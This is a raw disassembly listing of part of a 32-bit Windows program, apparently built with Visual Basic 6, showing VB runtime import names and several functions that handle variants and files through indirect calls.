  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	00 5f 5f             	add    %bl,0x5f(%edi)
  4031b6:	76 62                	jbe    0x40321a
  4031b8:	61                   	popa
  4031b9:	56                   	push   %esi
  4031ba:	61                   	popa
  4031bb:	72 54                	jb     0x403211
  4031bd:	73 74                	jae    0x403233
  4031bf:	4c                   	dec    %esp
  4031c0:	74 00                	je     0x4031c2
  4031c2:	00 00                	add    %al,(%eax)
  4031c4:	5f                   	pop    %edi
  4031c5:	5f                   	pop    %edi
  4031c6:	76 62                	jbe    0x40322a
  4031c8:	61                   	popa
  4031c9:	56                   	push   %esi
  4031ca:	61                   	popa
  4031cb:	72 4d                	jb     0x40321a
  4031cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ce:	76 65                	jbe    0x403235
  4031d0:	00 00                	add    %al,(%eax)
  4031d2:	00 00                	add    %al,(%eax)
  4031d4:	5f                   	pop    %edi
  4031d5:	5f                   	pop    %edi
  4031d6:	76 62                	jbe    0x40323a
  4031d8:	61                   	popa
  4031d9:	41                   	inc    %ecx
  4031da:	72 79                	jb     0x403255
  4031dc:	44                   	inc    %esp
  4031dd:	65 73 74             	gs jae 0x403254
  4031e0:	72 75                	jb     0x403257
  4031e2:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  4031e6:	00 00                	add    %al,(%eax)
  4031e8:	5f                   	pop    %edi
  4031e9:	5f                   	pop    %edi
  4031ea:	76 62                	jbe    0x40324e
  4031ec:	61                   	popa
  4031ed:	46                   	inc    %esi
  4031ee:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  4031f5:	65 
  4031f6:	00 00                	add    %al,(%eax)
  4031f8:	5f                   	pop    %edi
  4031f9:	5f                   	pop    %edi
  4031fa:	76 62                	jbe    0x40325e
  4031fc:	61                   	popa
  4031fd:	46                   	inc    %esi
  4031fe:	72 65                	jb     0x403265
  403200:	65 56                	gs push %esi
  403202:	61                   	popa
  403203:	72 00                	jb     0x403205
  403205:	00 00                	add    %al,(%eax)
  403207:	00 5f 5f             	add    %bl,0x5f(%edi)
  40320a:	76 62                	jbe    0x40326e
  40320c:	61                   	popa
  40320d:	56                   	push   %esi
  40320e:	61                   	popa
  40320f:	72 32                	jb     0x403243
  403211:	56                   	push   %esi
  403212:	65 63 00             	arpl   %eax,%gs:(%eax)
  403215:	00 00                	add    %al,(%eax)
  403217:	00 5f 5f             	add    %bl,0x5f(%edi)
  40321a:	76 62                	jbe    0x40327e
  40321c:	61                   	popa
  40321d:	41                   	inc    %ecx
  40321e:	72 79                	jb     0x403299
  403220:	4d                   	dec    %ebp
  403221:	6f                   	outsl  %ds:(%esi),(%dx)
  403222:	76 65                	jbe    0x403289
  403224:	00 00                	add    %al,(%eax)
  403226:	00 00                	add    %al,(%eax)
  403228:	5f                   	pop    %edi
  403229:	5f                   	pop    %edi
  40322a:	76 62                	jbe    0x40328e
  40322c:	61                   	popa
  40322d:	46                   	inc    %esi
  40322e:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  403235:	00 
  403236:	00 00                	add    %al,(%eax)
  403238:	c0 32 40             	shlb   $0x40,(%edx)
	...
  403283:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403286:	40                   	inc    %eax
  403287:	00 ff                	add    %bh,%bh
  403289:	ff                   	(bad)
  40328a:	ff                   	(bad)
  40328b:	ff 00                	incl   (%eax)
  40328d:	00 00                	add    %al,(%eax)
  40328f:	00 38                	add    %bh,(%eax)
  403291:	32 40 00             	xor    0x0(%eax),%al
	...
  4032a0:	ff                   	(bad)
  4032a1:	ff                   	(bad)
  4032a2:	ff                   	(bad)
  4032a3:	ff 00                	incl   (%eax)
  4032a5:	00 00                	add    %al,(%eax)
  4032a7:	00 74 2b 40          	add    %dh,0x40(%ebx,%ebp,1)
  4032ab:	00 10                	add    %dl,(%eax)
  4032ad:	2b 40 00             	sub    0x0(%eax),%eax
  4032b0:	d8 62 40             	fsubs  0x40(%edx)
  4032b3:	00 74 2b 40          	add    %dh,0x40(%ebx,%ebp,1)
  4032b7:	00 9c 2b 40 00 dc 62 	add    %bl,0x62dc0040(%ebx,%ebp,1)
  4032be:	40                   	inc    %eax
  4032bf:	00 00                	add    %al,(%eax)
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	00 b8 27 40 00 ff    	add    %bh,-0xffbfd9(%eax)
  4032c9:	ff                   	(bad)
  4032ca:	ff                   	(bad)
  4032cb:	ff 00                	incl   (%eax)
  4032cd:	00 00                	add    %al,(%eax)
  4032cf:	00 09                	add    %cl,(%ecx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	00 00                	add    %al,(%eax)
  4032d5:	00 00                	add    %al,(%eax)
  4032d7:	00 3c 32             	add    %bh,(%edx,%esi,1)
  4032da:	40                   	inc    %eax
  4032db:	00 00                	add    %al,(%eax)
  4032dd:	00 00                	add    %al,(%eax)
  4032df:	00 5c 32 40          	add    %bl,0x40(%edx,%esi,1)
  4032e3:	00 38                	add    %bh,(%eax)
  4032e5:	32 40 00             	xor    0x0(%eax),%al
  4032e8:	38 32                	cmp    %dh,(%edx)
  4032ea:	40                   	inc    %eax
	...
  4032f7:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4032fb:	00 04 00             	add    %al,(%eax,%eax,1)
  4032fe:	00 00                	add    %al,(%eax)
  403300:	e9 e9 e9 e9 cc       	jmp    0xcd2a1cee
  403305:	cc                   	int3
  403306:	cc                   	int3
  403307:	cc                   	int3
  403308:	cc                   	int3
  403309:	cc                   	int3
  40330a:	cc                   	int3
  40330b:	cc                   	int3
  40330c:	cc                   	int3
  40330d:	cc                   	int3
  40330e:	cc                   	int3
  40330f:	cc                   	int3
  403310:	55                   	push   %ebp
  403311:	8b ec                	mov    %esp,%ebp
  403313:	83 ec 0c             	sub    $0xc,%esp
  403316:	68 f6 12 40 00       	push   $0x4012f6
  40331b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403321:	50                   	push   %eax
  403322:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403329:	83 ec 40             	sub    $0x40,%esp
  40332c:	53                   	push   %ebx
  40332d:	56                   	push   %esi
  40332e:	57                   	push   %edi
  40332f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403332:	c7 45 f8 48 11 40 00 	movl   $0x401148,-0x8(%ebp)
  403339:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40333c:	8b 75 08             	mov    0x8(%ebp),%esi
  40333f:	33 c0                	xor    %eax,%eax
  403341:	89 01                	mov    %eax,(%ecx)
  403343:	8b 56 3c             	mov    0x3c(%esi),%edx
  403346:	52                   	push   %edx
  403347:	6a 01                	push   $0x1
  403349:	6a ff                	push   $0xffffffff
  40334b:	6a 20                	push   $0x20
  40334d:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403350:	89 45 cc             	mov    %eax,-0x34(%ebp)
  403353:	89 45 c8             	mov    %eax,-0x38(%ebp)
  403356:	ff 15 d4 10 40 00    	call   *0x4010d4
  40335c:	6a 01                	push   $0x1
  40335e:	ff 15 d8 10 40 00    	call   *0x4010d8
  403364:	6a 01                	push   $0x1
  403366:	50                   	push   %eax
  403367:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40336a:	50                   	push   %eax
  40336b:	ff 15 98 10 40 00    	call   *0x401098
  403371:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403374:	8d 55 c8             	lea    -0x38(%ebp),%edx
  403377:	51                   	push   %ecx
  403378:	52                   	push   %edx
  403379:	ff 15 dc 10 40 00    	call   *0x4010dc
  40337f:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403382:	83 c6 34             	add    $0x34,%esi
  403385:	50                   	push   %eax
  403386:	56                   	push   %esi
  403387:	ff 15 0c 10 40 00    	call   *0x40100c
  40338d:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403390:	ff 15 10 10 40 00    	call   *0x401010
  403396:	6a 01                	push   $0x1
  403398:	ff 15 78 10 40 00    	call   *0x401078
  40339e:	68 cb 33 40 00       	push   $0x4033cb
  4033a3:	eb 25                	jmp    0x4033ca
  4033a5:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  4033a9:	74 09                	je     0x4033b4
  4033ab:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4033ae:	ff 15 10 10 40 00    	call   *0x401010
  4033b4:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4033b7:	ff 15 10 10 40 00    	call   *0x401010
  4033bd:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4033c0:	51                   	push   %ecx
  4033c1:	6a 00                	push   $0x0
  4033c3:	ff 15 40 10 40 00    	call   *0x401040
  4033c9:	c3                   	ret
  4033ca:	c3                   	ret
  4033cb:	8b 55 0c             	mov    0xc(%ebp),%edx
  4033ce:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4033d1:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4033d4:	5f                   	pop    %edi
  4033d5:	89 02                	mov    %eax,(%edx)
  4033d7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4033da:	5e                   	pop    %esi
  4033db:	5b                   	pop    %ebx
  4033dc:	89 4a 04             	mov    %ecx,0x4(%edx)
  4033df:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4033e2:	89 42 08             	mov    %eax,0x8(%edx)
  4033e5:	33 c0                	xor    %eax,%eax
  4033e7:	89 4a 0c             	mov    %ecx,0xc(%edx)
  4033ea:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4033ed:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4033f4:	8b e5                	mov    %ebp,%esp
  4033f6:	5d                   	pop    %ebp
  4033f7:	c2 08 00             	ret    $0x8
  4033fa:	90                   	nop
  4033fb:	90                   	nop
  4033fc:	90                   	nop
  4033fd:	90                   	nop
  4033fe:	90                   	nop
  4033ff:	90                   	nop
  403400:	55                   	push   %ebp
  403401:	8b ec                	mov    %esp,%ebp
  403403:	83 ec 0c             	sub    $0xc,%esp
  403406:	68 f6 12 40 00       	push   $0x4012f6
  40340b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403411:	50                   	push   %eax
  403412:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403419:	83 ec 50             	sub    $0x50,%esp
  40341c:	53                   	push   %ebx
  40341d:	56                   	push   %esi
  40341e:	57                   	push   %edi
  40341f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403422:	c7 45 f8 58 11 40 00 	movl   $0x401158,-0x8(%ebp)
  403429:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40342c:	8b 75 08             	mov    0x8(%ebp),%esi
  40342f:	33 c0                	xor    %eax,%eax
  403431:	89 01                	mov    %eax,(%ecx)
  403433:	8b 56 40             	mov    0x40(%esi),%edx
  403436:	52                   	push   %edx
  403437:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40343a:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40343d:	89 45 bc             	mov    %eax,-0x44(%ebp)
  403440:	89 45 b8             	mov    %eax,-0x48(%ebp)
  403443:	89 45 a8             	mov    %eax,-0x58(%ebp)
  403446:	ff 15 00 11 40 00    	call   *0x401100
  40344c:	8d 55 a8             	lea    -0x58(%ebp),%edx
  40344f:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403452:	89 45 b0             	mov    %eax,-0x50(%ebp)
  403455:	c7 45 a8 03 00 00 00 	movl   $0x3,-0x58(%ebp)
  40345c:	ff 15 08 10 40 00    	call   *0x401008
  403462:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403465:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403468:	50                   	push   %eax
  403469:	51                   	push   %ecx
  40346a:	c7 45 b0 40 42 0f 00 	movl   $0xf4240,-0x50(%ebp)
  403471:	c7 45 a8 03 80 00 00 	movl   $0x8003,-0x58(%ebp)
  403478:	ff 15 68 10 40 00    	call   *0x401068
  40347e:	66 85 c0             	test   %ax,%ax
  403481:	74 52                	je     0x4034d5
  403483:	8b 56 40             	mov    0x40(%esi),%edx
  403486:	52                   	push   %edx
  403487:	6a 02                	push   $0x2
  403489:	6a ff                	push   $0xffffffff
  40348b:	6a 20                	push   $0x20
  40348d:	ff 15 d4 10 40 00    	call   *0x4010d4
  403493:	6a 02                	push   $0x2
  403495:	ff 15 d8 10 40 00    	call   *0x4010d8
  40349b:	6a 02                	push   $0x2
  40349d:	50                   	push   %eax
  40349e:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4034a1:	50                   	push   %eax
  4034a2:	ff 15 98 10 40 00    	call   *0x401098
  4034a8:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4034ab:	8d 55 b8             	lea    -0x48(%ebp),%edx
  4034ae:	51                   	push   %ecx
  4034af:	52                   	push   %edx
  4034b0:	ff 15 dc 10 40 00    	call   *0x4010dc
  4034b6:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4034b9:	83 c6 38             	add    $0x38,%esi
  4034bc:	50                   	push   %eax
  4034bd:	56                   	push   %esi
  4034be:	ff 15 0c 10 40 00    	call   *0x40100c
  4034c4:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4034c7:	ff 15 10 10 40 00    	call   *0x401010
  4034cd:	6a 02                	push   $0x2
  4034cf:	ff 15 78 10 40 00    	call   *0x401078
  4034d5:	68 0b 35 40 00       	push   $0x40350b
  4034da:	eb 25                	jmp    0x403501
  4034dc:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  4034e0:	74 09                	je     0x4034eb
  4034e2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4034e5:	ff 15 10 10 40 00    	call   *0x401010
  4034eb:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4034ee:	ff 15 10 10 40 00    	call   *0x401010
  4034f4:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4034f7:	51                   	push   %ecx
  4034f8:	6a 00                	push   $0x0
  4034fa:	ff 15 40 10 40 00    	call   *0x401040
  403500:	c3                   	ret
  403501:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403504:	ff 15 10 10 40 00    	call   *0x401010
  40350a:	c3                   	ret
  40350b:	8b 55 0c             	mov    0xc(%ebp),%edx
  40350e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403511:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403514:	5f                   	pop    %edi
  403515:	89 02                	mov    %eax,(%edx)
  403517:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40351a:	5e                   	pop    %esi
  40351b:	5b                   	pop    %ebx
  40351c:	89 4a 04             	mov    %ecx,0x4(%edx)
  40351f:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403522:	89 42 08             	mov    %eax,0x8(%edx)
  403525:	33 c0                	xor    %eax,%eax
  403527:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40352a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40352d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403534:	8b e5                	mov    %ebp,%esp
  403536:	5d                   	pop    %ebp
  403537:	c2 08 00             	ret    $0x8
  40353a:	90                   	nop
  40353b:	90                   	nop
  40353c:	90                   	nop
  40353d:	90                   	nop
  40353e:	90                   	nop
  40353f:	90                   	nop
  403540:	55                   	push   %ebp
  403541:	8b ec                	mov    %esp,%ebp
  403543:	83 ec 14             	sub    $0x14,%esp
  403546:	68 f6 12 40 00       	push   $0x4012f6
  40354b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403551:	50                   	push   %eax
  403552:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403559:	83 ec 30             	sub    $0x30,%esp
  40355c:	53                   	push   %ebx
  40355d:	56                   	push   %esi
  40355e:	57                   	push   %edi
  40355f:	89 65 ec             	mov    %esp,-0x14(%ebp)
  403562:	c7 45 f0 68 11 40 00 	movl   $0x401168,-0x10(%ebp)
  403569:	33 c0                	xor    %eax,%eax
  40356b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40356e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403571:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403574:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  403577:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40357a:	89 01                	mov    %eax,(%ecx)
  40357c:	6a 01                	push   $0x1
  40357e:	ff 15 4c 10 40 00    	call   *0x40104c
  403584:	8b 75 08             	mov    0x8(%ebp),%esi
  403587:	8d 7e 40             	lea    0x40(%esi),%edi
  40358a:	89 7d cc             	mov    %edi,-0x34(%ebp)
  40358d:	c7 45 c4 08 40 00 00 	movl   $0x4008,-0x3c(%ebp)
  403594:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  403597:	52                   	push   %edx
  403598:	ff 15 80 10 40 00    	call   *0x401080
  40359e:	8d 5e 44             	lea    0x44(%esi),%ebx
  4035a1:	8b 03                	mov    (%ebx),%eax
  4035a3:	50                   	push   %eax
  4035a4:	6a 04                	push   $0x4
  4035a6:	6a ff                	push   $0xffffffff
  4035a8:	6a 20                	push   $0x20
  4035aa:	ff 15 d4 10 40 00    	call   *0x4010d4
  4035b0:	6a 04                	push   $0x4
  4035b2:	8d 4e 34             	lea    0x34(%esi),%ecx
  4035b5:	51                   	push   %ecx
  4035b6:	68 ec 2b 40 00       	push   $0x402bec
  4035bb:	ff 15 84 10 40 00    	call   *0x401084
  4035c1:	6a 04                	push   $0x4
  4035c3:	8b 56 3c             	mov    0x3c(%esi),%edx
  4035c6:	52                   	push   %edx
  4035c7:	ff 15 00 11 40 00    	call   *0x401100
  4035cd:	50                   	push   %eax
  4035ce:	83 c6 38             	add    $0x38,%esi
  4035d1:	56                   	push   %esi
  4035d2:	68 ec 2b 40 00       	push   $0x402bec
  4035d7:	ff 15 88 10 40 00    	call   *0x401088
  4035dd:	6a 04                	push   $0x4
  4035df:	ff 15 78 10 40 00    	call   *0x401078
  4035e5:	8b 07                	mov    (%edi),%eax
  4035e7:	50                   	push   %eax
  4035e8:	8b 0b                	mov    (%ebx),%ecx
  4035ea:	51                   	push   %ecx
  4035eb:	ff 15 f4 10 40 00    	call   *0x4010f4
  4035f1:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4035f4:	c7 45 c4 08 40 00 00 	movl   $0x4008,-0x3c(%ebp)
  4035fb:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  4035fe:	52                   	push   %edx
  4035ff:	ff 15 80 10 40 00    	call   *0x401080
  403605:	6a 04                	push   $0x4
  403607:	8b 07                	mov    (%edi),%eax
  403609:	50                   	push   %eax
  40360a:	ff 15 38 11 40 00    	call   *0x401138
  403610:	ff 15 44 10 40 00    	call   *0x401044
  403616:	68 35 36 40 00       	push   $0x403635
  40361b:	eb 17                	jmp    0x403634
  40361d:	ff 15 44 10 40 00    	call   *0x401044
  403623:	68 35 36 40 00       	push   $0x403635
  403628:	eb 0a                	jmp    0x403634
  40362a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40362d:	ff 15 10 10 40 00    	call   *0x401010
  403633:	c3                   	ret
  403634:	c3                   	ret
  403635:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403638:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40363b:	89 11                	mov    %edx,(%ecx)
  40363d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403640:	89 41 04             	mov    %eax,0x4(%ecx)
  403643:	8b 55 dc             	mov    -0x24(%ebp),%edx
  403646:	89 51 08             	mov    %edx,0x8(%ecx)
  403649:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40364c:	89 41 0c             	mov    %eax,0xc(%ecx)
  40364f:	33 c0                	xor    %eax,%eax
  403651:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403654:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40365b:	5f                   	pop    %edi
  40365c:	5e                   	pop    %esi
  40365d:	5b                   	pop    %ebx
  40365e:	8b e5                	mov    %ebp,%esp
  403660:	5d                   	pop    %ebp
  403661:	c2 08 00             	ret    $0x8
  403664:	90                   	nop
  403665:	90                   	nop
  403666:	90                   	nop
  403667:	90                   	nop
  403668:	90                   	nop
  403669:	90                   	nop
  40366a:	90                   	nop
  40366b:	90                   	nop
  40366c:	90                   	nop
  40366d:	90                   	nop
  40366e:	90                   	nop
  40366f:	90                   	nop
  403670:	55                   	push   %ebp
  403671:	8b ec                	mov    %esp,%ebp
  403673:	83 ec 18             	sub    $0x18,%esp
  403676:	68 f6 12 40 00       	push   $0x4012f6
  40367b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403681:	50                   	push   %eax
  403682:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403689:	b8 38 01 00 00       	mov    $0x138,%eax
  40368e:	e8 5d dc ff ff       	call   0x4012f0
  403693:	53                   	push   %ebx
  403694:	56                   	push   %esi
  403695:	57                   	push   %edi
  403696:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403699:	c7 45 ec 90 11 40 00 	movl   $0x401190,-0x14(%ebp)
  4036a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4036a3:	83 e0 01             	and    $0x1,%eax
  4036a6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4036a9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4036ac:	83 e1 fe             	and    $0xfffffffe,%ecx
  4036af:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4036b2:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4036b9:	8b 55 08             	mov    0x8(%ebp),%edx
  4036bc:	8b 02                	mov    (%edx),%eax
  4036be:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4036c1:	51                   	push   %ecx
  4036c2:	ff 50 04             	call   *0x4(%eax)
  4036c5:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4036cc:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4036d3:	6a ff                	push   $0xffffffff
  4036d5:	ff 15 4c 10 40 00    	call   *0x40104c
  4036db:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  4036e2:	66 c7 45 c4 00 00    	movw   $0x0,-0x3c(%ebp)
  4036e8:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4036ef:	68 14 2c 40 00       	push   $0x402c14
  4036f4:	ff 15 00 11 40 00    	call   *0x401100
  4036fa:	8b c8                	mov    %eax,%ecx
  4036fc:	ff 15 8c 10 40 00    	call   *0x40108c
  403702:	66 89 45 c4          	mov    %ax,-0x3c(%ebp)
  403706:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  40370d:	66 83 7d c4 00       	cmpw   $0x0,-0x3c(%ebp)
  403712:	0f 8e be 00 00 00    	jle    0x4037d6
  403718:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  40371f:	c7 85 70 ff ff ff 04 	movl   $0x80020004,-0x90(%ebp)
  403726:	00 02 80 
  403729:	c7 85 68 ff ff ff 0a 	movl   $0xa,-0x98(%ebp)
  403730:	00 00 00 
  403733:	c7 45 80 04 00 02 80 	movl   $0x80020004,-0x80(%ebp)
  40373a:	c7 85 78 ff ff ff 0a 	movl   $0xa,-0x88(%ebp)
  403741:	00 00 00 
  403744:	c7 85 50 ff ff ff 70 	movl   $0x402c70,-0xb0(%ebp)
  40374b:	2c 40 00 
  40374e:	c7 85 48 ff ff ff 08 	movl   $0x8,-0xb8(%ebp)
  403755:	00 00 00 
  403758:	8d 95 48 ff ff ff    	lea    -0xb8(%ebp),%edx
  40375e:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  403761:	ff 15 14 11 40 00    	call   *0x401114
  403767:	c7 85 60 ff ff ff 50 	movl   $0x402c50,-0xa0(%ebp)
  40376e:	2c 40 00 
  403771:	c7 85 58 ff ff ff 08 	movl   $0x8,-0xa8(%ebp)
  403778:	00 00 00 
  40377b:	8d 95 58 ff ff ff    	lea    -0xa8(%ebp),%edx
  403781:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  403784:	ff 15 14 11 40 00    	call   *0x401114
  40378a:	8d 95 68 ff ff ff    	lea    -0x98(%ebp),%edx
  403790:	52                   	push   %edx
  403791:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  403797:	50                   	push   %eax
  403798:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  40379b:	51                   	push   %ecx
  40379c:	6a 10                	push   $0x10
  40379e:	8d 55 98             	lea    -0x68(%ebp),%edx
  4037a1:	52                   	push   %edx
  4037a2:	ff 15 50 10 40 00    	call   *0x401050
  4037a8:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  4037ae:	50                   	push   %eax
  4037af:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  4037b5:	51                   	push   %ecx
  4037b6:	8d 55 88             	lea    -0x78(%ebp),%edx
  4037b9:	52                   	push   %edx
  4037ba:	8d 45 98             	lea    -0x68(%ebp),%eax
  4037bd:	50                   	push   %eax
  4037be:	6a 04                	push   $0x4
  4037c0:	ff 15 1c 10 40 00    	call   *0x40101c
  4037c6:	83 c4 14             	add    $0x14,%esp
  4037c9:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  4037d0:	ff 15 20 10 40 00    	call   *0x401020
  4037d6:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  4037dd:	68 80 2c 40 00       	push   $0x402c80
  4037e2:	ff 15 b8 10 40 00    	call   *0x4010b8
  4037e8:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  4037ef:	83 3d d4 62 40 00 00 	cmpl   $0x0,0x4062d4
  4037f6:	75 1c                	jne    0x403814
  4037f8:	68 d4 62 40 00       	push   $0x4062d4
  4037fd:	68 dc 2c 40 00       	push   $0x402cdc
  403802:	ff 15 e0 10 40 00    	call   *0x4010e0
  403808:	c7 85 e4 fe ff ff d4 	movl   $0x4062d4,-0x11c(%ebp)
  40380f:	62 40 00 
  403812:	eb 0a                	jmp    0x40381e
  403814:	c7 85 e4 fe ff ff d4 	movl   $0x4062d4,-0x11c(%ebp)
  40381b:	62 40 00 
  40381e:	8b 8d e4 fe ff ff    	mov    -0x11c(%ebp),%ecx
  403824:	8b 11                	mov    (%ecx),%edx
  403826:	89 95 20 ff ff ff    	mov    %edx,-0xe0(%ebp)
  40382c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40382f:	50                   	push   %eax
  403830:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  403836:	8b 11                	mov    (%ecx),%edx
  403838:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  40383e:	50                   	push   %eax
  40383f:	ff 52 14             	call   *0x14(%edx)
  403842:	db e2                	fnclex
  403844:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  40384a:	83 bd 1c ff ff ff 00 	cmpl   $0x0,-0xe4(%ebp)
  403851:	7d 23                	jge    0x403876
  403853:	6a 14                	push   $0x14
  403855:	68 cc 2c 40 00       	push   $0x402ccc
  40385a:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  403860:	51                   	push   %ecx
  403861:	8b 95 1c ff ff ff    	mov    -0xe4(%ebp),%edx
  403867:	52                   	push   %edx
  403868:	ff 15 38 10 40 00    	call   *0x401038
  40386e:	89 85 e0 fe ff ff    	mov    %eax,-0x120(%ebp)
  403874:	eb 0a                	jmp    0x403880
  403876:	c7 85 e0 fe ff ff 00 	movl   $0x0,-0x120(%ebp)
  40387d:	00 00 00 
  403880:	8b 45 ac             	mov    -0x54(%ebp),%eax
  403883:	89 85 18 ff ff ff    	mov    %eax,-0xe8(%ebp)
  403889:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40388c:	51                   	push   %ecx
  40388d:	8b 95 18 ff ff ff    	mov    -0xe8(%ebp),%edx
  403893:	8b 02                	mov    (%edx),%eax
  403895:	8b 8d 18 ff ff ff    	mov    -0xe8(%ebp),%ecx
  40389b:	51                   	push   %ecx
  40389c:	ff 50 50             	call   *0x50(%eax)
  40389f:	db e2                	fnclex
  4038a1:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  4038a7:	83 bd 14 ff ff ff 00 	cmpl   $0x0,-0xec(%ebp)
  4038ae:	7d 23                	jge    0x4038d3
  4038b0:	6a 50                	push   $0x50
  4038b2:	68 ec 2c 40 00       	push   $0x402cec
  4038b7:	8b 95 18 ff ff ff    	mov    -0xe8(%ebp),%edx
  4038bd:	52                   	push   %edx
  4038be:	8b 85 14 ff ff ff    	mov    -0xec(%ebp),%eax
  4038c4:	50                   	push   %eax
  4038c5:	ff 15 38 10 40 00    	call   *0x401038
  4038cb:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
  4038d1:	eb 0a                	jmp    0x4038dd
  4038d3:	c7 85 dc fe ff ff 00 	movl   $0x0,-0x124(%ebp)
  4038da:	00 00 00 
  4038dd:	83 3d d4 62 40 00 00 	cmpl   $0x0,0x4062d4
  4038e4:	75 1c                	jne    0x403902
  4038e6:	68 d4 62 40 00       	push   $0x4062d4
  4038eb:	68 dc 2c 40 00       	push   $0x402cdc
  4038f0:	ff 15 e0 10 40 00    	call   *0x4010e0
  4038f6:	c7 85 d8 fe ff ff d4 	movl   $0x4062d4,-0x128(%ebp)
  4038fd:	62 40 00 
  403900:	eb 0a                	jmp    0x40390c
  403902:	c7 85 d8 fe ff ff d4 	movl   $0x4062d4,-0x128(%ebp)
  403909:	62 40 00 
